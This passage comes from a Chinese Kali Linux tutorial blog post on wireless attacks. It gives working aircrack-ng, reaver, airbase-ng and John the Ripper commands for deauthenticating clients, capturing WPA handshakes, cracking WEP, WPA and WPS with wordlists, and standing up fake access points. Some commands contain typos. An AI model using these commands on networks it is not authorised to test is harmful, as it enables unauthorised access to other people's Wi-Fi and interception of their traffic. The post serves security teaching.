#在所有信道进行轮询监听数据包</span><br><span class="line">airodump wlan2mon -C 1 --bssid 00:1 1:22:33:44:55 -W file.cap</span><br><span class="line"><span class="meta">	#</span><span class="bash">抓取指定信道、指定AP的数据包，并保存到文件中</span></span><br><span class="line">aireplay -9 wlan2mon</span><br><span class="line">airreplay</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    BSSID: AP的MAC地址</span><br><span class="line">    PWR:网卡接收到的信号强度，距离越近信号越强</span><br><span class="line">    -1:驱动不支持信号强度、STA距离超出信号接受范围</span><br><span class="line">    RXQ:最近10秒成功接收的数据帧的百分比(数据帧、管理帧)，只有在固定信道</span><br><span class="line">    时才会出现，</span><br><span class="line">    Beacons:接收到此AP发送的beacon帧数量</span><br><span class="line">    #Data:抓到的数据帧数量(WEP表示|IV数量) ，包含广播数据帧</span><br><span class="line">    #/s:最近10秒内，每秒平均抓到的帧的数量</span><br><span class="line">    CH:信道号(从beacon帧中获得)，信道重叠时可能发现其他信道</span><br><span class="line">    MB: AP支持的最大速率</span><br><span class="line">    ENC:采用的无线安全技术WEP、WPA、WPA2、OPEN</span><br><span class="line">    CIPHER:采用的加密套件CCMP、TKIP、 WEP40、WEP104</span><br><span class="line">    AUTH:身份认证方法MGT、PSK、 SKA、OPEN</span><br><span class="line">    ESSID:无线网络名称，隐藏AP此值可能为空，airodump从probe和</span><br><span class="line">    association request帧中发现隐藏AP</span><br><span class="line">    STATION: STA的MAC地址</span><br><span class="line">    Lost:通过sequence number判断最近10秒STA发送丢失的数据包数量(管</span><br><span class="line">    理帧、数据帧)</span><br><span class="line">    	干扰、距离</span><br><span class="line">    	发包不能收、收包不能发</span><br><span class="line">    Packets: STA发送的数据包数量</span><br><span class="line">    Probes: STA探测的ESSID</span><br></pre></td></tr></table></figure><h4 id="AIRPLAY-NG"><a href="#AIRPLAY-NG" class="headerlink" title="AIRPLAY-NG"></a>AIRPLAY-NG</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">产生或者加速无线通信流量</span><br><span class="line">	向无线网络中注入数据包</span><br><span class="line">		伪造身份验证</span><br><span class="line">		强制重新身份验证</span><br><span class="line">		抓包重放</span><br><span class="line">	用于后续WEP和WPA密码破解</span><br><span class="line">	支持10种包注入</span><br><span class="line">获取包的两种途径</span><br><span class="line">	指定接口(-i)</span><br><span class="line">	抓包文件pcap (-r)</span><br><span class="line">使用：</span><br><span class="line">aireplay-ng &lt;options&gt; &lt;interface name&gt;</span><br></pre></td></tr></table></figure><blockquote><p>Filter Options</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200612155352483.png" alt="image-20200612155352483"></p><h4 id="AIREPLAY-NG排错"><a href="#AIREPLAY-NG排错" class="headerlink" title="AIREPLAY-NG排错"></a>AIREPLAY-NG排错</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Aireplay- ng命令挂起没有任何输出</span><br><span class="line">	无线网卡与<span class="keyword">AP</span>工作在不同信道</span><br><span class="line">报错“write failed: Cannot allocate <span class="keyword">memory</span> wi_ write(): llegal seek"</span><br><span class="line">	无线网卡使用Broadcom芯片(bcm43xx) ，替换为b43驱动可解决</span><br><span class="line">可注入但速度很慢，并提示内核消息“rtc: lost some interrupts at 1024Hz"</span><br><span class="line">	没有修正方法，此时可以启动多个aireplay-ng命令提高速度</span><br><span class="line">使用-<span class="keyword">h</span>参数指定注入<span class="keyword">MAC</span>地址与网卡<span class="keyword">MAC</span>地址不一致报错</span><br><span class="line">	建议保持一致(macchange)，先修改<span class="keyword">MAC</span></span><br></pre></td></tr></table></figure><h4 id="AIREPLAY-NG包注入测试"><a href="#AIREPLAY-NG包注入测试" class="headerlink" title="AIREPLAY-NG包注入测试"></a>AIREPLAY-NG包注入测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">检测网卡是否可以注入包</span><br><span class="line">检测AP的响应时间</span><br><span class="line">	回包率反应链路质量</span><br><span class="line">如果有两个无线网卡，可以检测具体可以注入哪种攻击</span><br><span class="line">基本测试检测AP对probe广播的响应</span><br><span class="line">	向每AP发30包</span><br><span class="line">	网卡成功发送并可接收包的能力</span><br><span class="line"></span><br><span class="line">基本测试</span><br><span class="line">	aireplay -9 wlan2mon</span><br><span class="line">向隐藏AP/指定SSID注入</span><br><span class="line">	aireplay-ng -9 -e leven -a EC:26:CA:FA:02:DC wlan2mon</span><br></pre></td></tr></table></figure><h4 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">管理员误以为<span class="keyword">MAC</span>绑定是一种安全机制</span><br><span class="line">限制可以关联的客户端<span class="keyword">MAC</span>地址</span><br><span class="line">准备<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>基本配置</span><br><span class="line">	<span class="keyword">Open</span>认证</span><br><span class="line">	开启无线过滤</span><br><span class="line">修改<span class="keyword">MAC</span>地址绕过过滤</span><br></pre></td></tr></table></figure><h4 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WEP密码破解原理</span><br><span class="line">	IV并非完全随机</span><br><span class="line">	每<span class="number">224</span>个包可能出现一次IV重用</span><br><span class="line">	收集大量IV之后找出相同IV及其对应密文，分析得出共享密码</span><br><span class="line">回包中包含IV</span><br><span class="line">IV足够多的情况下，任何复杂程度的wep密码都可以被破解</span><br></pre></td></tr></table></figure><h4 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">启动monitor模式</span><br><span class="line">启动抓包并保存抓包</span><br><span class="line">Deauthentication抓取XOR文件</span><br><span class="line">利用XOR文件与AP建立关联:</span><br><span class="line">	aireplay-ng -1 60 -e kifi -y xxxx.xor -a ap的mac -h 我的mac</span><br><span class="line">执行重放攻击（replay）</span><br><span class="line">Deauthentication 使得已经连接的双方断开重连，触发数据包</span><br><span class="line">收集足够DATA之后破解密码 </span><br><span class="line">Airdump-ng data 查看抓到多少IV值</span><br><span class="line">	官方建议值：</span><br><span class="line">		64bit密钥：25万</span><br><span class="line">		128bit密钥：150万</span><br><span class="line"></span><br><span class="line">使用aircrack-ng xxx.cap破解密码</span><br></pre></td></tr></table></figure><h4 id="WPA-PSK攻击"><a href="#WPA-PSK攻击" class="headerlink" title="WPA PSK攻击"></a>WPA PSK攻击</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">只有一种密码破解方法：</span><br><span class="line">	WPA不存在WEP的弱点</span><br><span class="line">只能暴力破解：</span><br><span class="line">	<span class="meta">CPU</span>资源</span><br><span class="line">	时间</span><br><span class="line">	字典质量： </span><br><span class="line">		网上共享的字典</span><br><span class="line">		泄露密码</span><br><span class="line">		地区电话号码段</span><br><span class="line">		Crunch生成字典</span><br><span class="line">		Kali中自带的字典文件</span><br><span class="line">		</span><br><span class="line">PSK破解过程：</span><br><span class="line">	启动<span class="keyword">monitor</span> </span><br><span class="line">	开始抓包并保存</span><br><span class="line">	Deauthentication攻击（解除认证攻击）获取<span class="number">4</span>步握手信息</span><br><span class="line">	使用字典暴力破解</span><br></pre></td></tr></table></figure><blockquote><p>首先嗅探指定MAC与AP之间的通信，保存cap文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng wlan0mon --bssid C0:A5:DD:9D:BA:2E -c 11 -w wpa</span><br></pre></td></tr></table></figure><blockquote><p>在新的窗口对目标连接进行Deauthentication攻击，从而获取四次握手信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -0 2 -a C0:A5:DD:9D:BA:2E -c 9C:28:F7:91:47:6E wlan0mon</span><br></pre></td></tr></table></figure><blockquote><p>尝试用kali自带的字典rockyou.txt破解密码，字典可以自行选择合适的</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aircrack-ng -w rockyou.txt /home/tosang/wpa-01.cap</span><br></pre></td></tr></table></figure><h4 id="AIROLIB破解密码"><a href="#AIROLIB破解密码" class="headerlink" title="AIROLIB破解密码"></a>AIROLIB破解密码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">设计用于存储ESSID和密码列表（本质上就是先计算再使用）</span><br><span class="line">    计算生成不变的PMK (计算资源消耗型)</span><br><span class="line">    PMK在破解阶段被用于计算PTK (速度快，计算资源要求少)</span><br><span class="line">    通过完整性:摘要值破解密码</span><br><span class="line">    SQLite3数据库存储数据</span><br><span class="line">    </span><br><span class="line">echo kifi &gt; essid.txt #保存SSID</span><br><span class="line">airolib-ng db --import essid essid.txt #导入数据库</span><br><span class="line">airolib-ng db --stats #查看数据库</span><br><span class="line">airolib-ng db --import passwd &lt;wordlist&gt; #导入字典</span><br><span class="line">	自动剔除不合格的WPA字典</span><br><span class="line">airolib-ng db --batch #计算hash密钥</span><br><span class="line">	生成PMK</span><br><span class="line">aircrack-ng -r db wpa.cap #使用计算好的数据库去破解</span><br></pre></td></tr></table></figure><h4 id="JTR密码破解"><a href="#JTR密码破解" class="headerlink" title="JTR密码破解"></a>JTR密码破解</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">John the ripper</span><br><span class="line">    快速的密码破解软件</span><br><span class="line">    支持基于规则扩展密码字典</span><br><span class="line">很多人喜欢用手机号码做无线密码</span><br><span class="line">	获取号段并利用JTR规则增加最后厂<span class="number">1</span>位的数字</span><br><span class="line">配置文件/etc/john/john.conf</span><br><span class="line">    [List.Rules:Wordlist]</span><br><span class="line">    $[<span class="number">0</span><span class="number">-9</span>]$[<span class="number">0</span><span class="number">-9</span>]$[<span class="number">0</span><span class="number">-9</span>]</span><br></pre></td></tr></table></figure><h4 id="WPS"><a href="#WPS" class="headerlink" title="WPS"></a>WPS</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">WPS是WiFi联盟2006年开发的一项技术</span><br><span class="line">    通过PIN码来简化无线接入的操作，无需记住PSK</span><br><span class="line">    路由器和网卡各按一个按钮就能接入无线</span><br><span class="line">    PIN码是分为前后各4位的2段共8位数字</span><br><span class="line">安全漏洞</span><br><span class="line">    2011年被发现安全涉及漏洞</span><br><span class="line">    接入发起方可以根据路由器的返回信息判断前4位是否正确</span><br><span class="line">    而PIN码的后4位只有1000种定义的组合(最后一位是checksum)</span><br><span class="line">    所以全部穷举破解只需要1 1000次尝试</span><br><span class="line">   		PSK: 218,340, 105,584,896</span><br><span class="line">	标准本身没有设计锁定机制，目前多个厂商已实现锁定机制</span><br><span class="line">	</span><br><span class="line">启动侦听模式后，发现支持WPS的AP</span><br><span class="line">	wash -C - wlan0mon</span><br><span class="line">	airodump-ng wlanOmon --wps</span><br><span class="line">爆破PIN码</span><br><span class="line">	reaver - wlan0mon -b &lt;AP mac&gt; -VV</span><br><span class="line">秒破PIN码</span><br><span class="line">	reaver wlan0mon -b &lt;AP mac&gt; -vv-K 1</span><br><span class="line">	pixiewps</span><br><span class="line">	只适用于固定厂商的芯片，成功率很低</span><br><span class="line">reaver -i wlanOmon -b &lt;AP mac&gt; -Vv -P 88888888</span><br></pre></td></tr></table></figure><blockquote><p>查看周围AP的wps信息</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200615174111204.png" alt="image-20200615174111204"></p><h4 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h4><blockquote><p>wifite是一款开箱即用的工具，无需使用各种命令</p></blockquote><h4 id="伪造无线AP"><a href="#伪造无线AP" class="headerlink" title="伪造无线AP"></a>伪造无线AP</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -a &lt;AP mac&gt; --essid “kifi" -C 11 wlan2mon</span><br><span class="line"><span class="meta">	#</span><span class="bash">伪造一个开放AP</span></span><br><span class="line">apt-get install bridge -utils</span><br><span class="line"><span class="meta">	#</span><span class="bash">安装网桥工具</span></span><br><span class="line">brctl addbr bridge</span><br><span class="line">brctl addif Wifi Bridge ethO</span><br><span class="line">brctl addif Wifi- Bridge atO</span><br><span class="line">ifconfig ethO 0.0.0.0 up</span><br><span class="line">ifconfig atO 0.0.0.0 up</span><br><span class="line">ifconfig bridge 192. 168.1.10 up</span><br><span class="line">route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1</span><br></pre></td></tr></table></figure><h4 id="3vilTwinAttacker"><a href="#3vilTwinAttacker" class="headerlink" title="3vilTwinAttacker"></a>3vilTwinAttacker</h4><blockquote><p>一款图形化AP伪造工具</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装教程如下：</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/P0cL4bs/3vilTwinAttacker.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> 3vilTwinAttacker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod +x installer.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./installer.sh --install</span></span><br></pre></td></tr></table></figure><h4 id="AIRDECAP-NG进行数据解密"><a href="#AIRDECAP-NG进行数据解密" class="headerlink" title="AIRDECAP-NG进行数据解密"></a>AIRDECAP-NG进行数据解密</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">去除802.1 1头</span><br><span class="line">	airdecap-ng -b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">解密WEP加密数据</span><br><span class="line">	airdecap-ng -W &lt;WEP key&gt;-b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">	必须与AP建立关联关系</span><br><span class="line">解密WPA加密数据</span><br><span class="line">	airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">	抓包文件中必须包含4步握手信息，否则无解</span><br></pre></td></tr></table></figure><blockquote><p>首先对我的ap进行抓包，使用wireshake查看如下</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616110428548.png" alt="image-20200616110428548"></p><blockquote><p>可以看到，上面数据包的Data字段是加密数据（均是802.11报头），无法直接查看。下面使用airdecap-ng进行解密（我的密码已经打码）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616111203921.png" alt="image-20200616111203921"></p><blockquote><p>再次使用wireshake查看，已经是tcp/IP报头</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616112022939.png" alt="image-20200616112022939"></p><h4 id="AIRSERV-NG"><a href="#AIRSERV-NG" class="headerlink" title="AIRSERV-NG"></a>AIRSERV-NG</h4><blockquote><p>AIRSERV-NG可以对AP联网远程操作</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">通过网络提供无线网卡服务器</span><br><span class="line">	某些网卡不支持客户端/服务器模式</span><br><span class="line">启动无线侦听</span><br><span class="line">服务器端</span><br><span class="line">	airserv-ng -P 3333 -d wlan2mon</span><br><span class="line">客户端</span><br><span class="line">	airodump-ng 远程ip:3333</span><br><span class="line">某些防火墙会影响C / S间的通信</span><br></pre></td></tr></table></figure><h4 id="AIRTUN-NG进行入侵检测"><a href="#AIRTUN-NG进行入侵检测" class="headerlink" title="AIRTUN-NG进行入侵检测"></a>AIRTUN-NG进行入侵检测</h4><blockquote><p>Airtun-NG是一个虚拟隧道接口创建工具，可以监视所有加密流量以实现wIDS</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">无线入侵检测wIDS</span><br><span class="line">    无线密码和BSSID</span><br><span class="line">    需要获取握手信息</span><br><span class="line">中继和重放</span><br><span class="line">	Repeate / Replay</span><br><span class="line">	</span><br><span class="line">wIDS</span><br><span class="line">    WEP: airtun-ng -a &lt;AP MAC&gt; -W SKA wlan2mon</span><br><span class="line">    WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK te kifi wlan2mon</span><br><span class="line">    	#开启后使用wireshake监听at0可以实时抓取所有包</span><br><span class="line">    	#也可以启用disniff、driftnet等嗅探工具对at0进行木马嗅探</span><br><span class="line">    ifconfig atO up（先开启后前面的命令才会生效）</span><br><span class="line">    四步握手</span><br><span class="line">    理论_上支持多AP的wlDS,但2个AP以上时可靠性会下降</span><br><span class="line">        WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kif1 wlan2mon</span><br><span class="line">        ifconfig at1 up</span><br><span class="line">        多AP不同信道时airodump -C 1,11 wlan2mon</span><br></pre></td></tr></table></figure></div><div class="post-widgets"><div id="needsharebutton-postbottom"><span class="btn"><i class="fa fa-share-alt" aria-hidden="true"></i></span></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>tosang</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://uestc-toy.github.io/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/" title="Kali使用教程（二）：无线攻击">http://uestc-toy.github.io/2020/06/24/Kali使用教程（二）：无线攻击/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-tags"><a href="/tags/Kali/" rel="tag"><i class="fa fa-tag"></i> Kali</a> <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/06/22/SpringCloud%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="prev" title="SpringCloud学习总结"><i class="fa fa-chevron-left"></i> SpringCloud学习总结</a></div><div class="post-nav-item"><a href="/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/" rel="next" title="Kali使用教程（三）：Web渗透">Kali使用教程（三）：Web渗透 <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#无线网卡配置"><span class="nav-number">1.</span> <span class="nav-text">无线网卡配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#协议"><span class="nav-number">2.</span> <span class="nav-text">协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DADIOTAP头"><span class="nav-number">2.1.</span> <span class="nav-text">DADIOTAP头</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BEACON-FRAMES"><span class="nav-number">2.2.</span> <span class="nav-text">BEACON FRAMES</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DATA-FRAMES"><span class="nav-number">2.3.</span> <span class="nav-text">DATA FRAMES</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#连接无线网络完整过程"><span class="nav-number">2.4.</span> <span class="nav-text">连接无线网络完整过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEP探测过程"><span class="nav-number">2.5.</span> <span class="nav-text">WEP探测过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA探测过程"><span class="nav-number">2.6.</span> <span class="nav-text">WPA探测过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEP-OPEN认证"><span class="nav-number">2.7.</span> <span class="nav-text">WEP OPEN认证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEP-PSK认证过程"><span class="nav-number">2.8.</span> <span class="nav-text">WEP PSK认证过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加密协议"><span class="nav-number">2.9.</span> <span class="nav-text">加密协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OPEN无加密网络"><span class="nav-number">2.10.</span> <span class="nav-text">OPEN无加密网络</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEP加密算法"><span class="nav-number">3.</span> <span class="nav-text">WEP加密算法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RC4算法"><span class="nav-number">3.1.</span> <span class="nav-text">RC4算法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WPA安全系统"><span class="nav-number">4.</span> <span class="nav-text">WPA安全系统</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA1"><span class="nav-number">4.1.</span> <span class="nav-text">WPA1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA2"><span class="nav-number">4.2.</span> <span class="nav-text">WPA2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA企业连接过程"><span class="nav-number">4.3.</span> <span class="nav-text">WPA企业连接过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA-PSK"><span class="nav-number">4.4.</span> <span class="nav-text">WPA-PSK</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#密钥交换"><span class="nav-number">4.5.</span> <span class="nav-text">密钥交换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无线渗透测试"><span class="nav-number">5.</span> <span class="nav-text">无线渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#AIRCRACK-NG基础"><span class="nav-number">5.1.</span> <span class="nav-text">AIRCRACK-NG基础</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AIRODUMP-NG"><span class="nav-number">5.2.</span> <span class="nav-text">AIRODUMP-NG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AIRPLAY-NG"><span class="nav-number">5.3.</span> <span class="nav-text">AIRPLAY-NG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AIREPLAY-NG排错"><span class="nav-number">5.4.</span> <span class="nav-text">AIREPLAY-NG排错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AIREPLAY-NG包注入测试"><span class="nav-number">5.5.</span> <span class="nav-text">AIREPLAY-NG包注入测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MAC地址绑定攻击"><span class="nav-number">5.6.</span> <span class="nav-text">MAC地址绑定攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEP攻击"><span class="nav-number">5.7.</span> <span class="nav-text">WEP攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEP共享密钥破解"><span class="nav-number">5.8.</span> <span class="nav-text">WEP共享密钥破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA-PSK攻击"><span class="nav-number">5.9.</span> <span class="nav-text">WPA PSK攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AIROLIB破解密码"><span class="nav-number">5.10.</span> <span class="nav-text">AIROLIB破解密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JTR密码破解"><span class="nav-number">5.11.</span> <span class="nav-text">JTR密码破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPS"><span class="nav-number">5.12.</span> <span class="nav-text">WPS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wifite"><span class="nav-number">5.13.</span> <span class="nav-text">wifite</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#伪造无线AP"><span class="nav-number">5.14.</span> <span class="nav-text">伪造无线AP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3vilTwinAttacker"><span class="nav-number">5.15.</span> <span class="nav-text">3vilTwinAttacker</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AIRDECAP-NG进行数据解密"><span class="nav-number">5.16.</span> <span class="nav-text">AIRDECAP-NG进行数据解密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AIRSERV-NG"><span class="nav-number">5.17.</span> <span class="nav-text">AIRSERV-NG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AIRTUN-NG进行入侵检测"><span class="nav-number">5.18.</span> <span 